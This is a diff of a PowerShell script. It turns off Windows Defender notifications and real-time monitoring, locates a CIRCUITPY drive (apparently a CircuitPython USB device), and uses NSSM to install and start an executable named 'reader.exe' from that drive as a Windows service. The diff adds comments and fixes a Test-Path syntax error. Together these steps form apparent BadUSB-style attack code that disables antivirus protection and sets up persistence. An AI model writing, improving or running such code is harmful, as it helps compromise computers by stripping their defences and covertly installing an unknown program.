@@ -1,8 +1,10 @@
+# Disable Enhanced Notifications
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -Value 1
 
-PowerShell -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications' -Name 'DisableEnhancedNotifications' -Value 1"
-
+# Disable Real-Time Monitoring
 Set-MpPreference -DisableRealtimeMonitoring $true
 
+# Find the CIRCUITPY drive
 $driveLetter = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.VolumeName -eq "CIRCUITPY" } | Select-Object -ExpandProperty DeviceID
 
 if ($driveLetter) {
@@ -21,7 +23,7 @@ if ($driveLetter) {
         $exePath = Join-Path $destinationPath "reader.exe"
 
         # Check if NSSM and the reader.exe file exist
-        if (Test-Path $nssmPath -and Test-Path $exePath) {
+        if ((Test-Path $nssmPath) -and (Test-Path $exePath)) {
             # Install and start the service
             & $nssmPath install $serviceName $exePath
             & $nssmPath start $serviceName
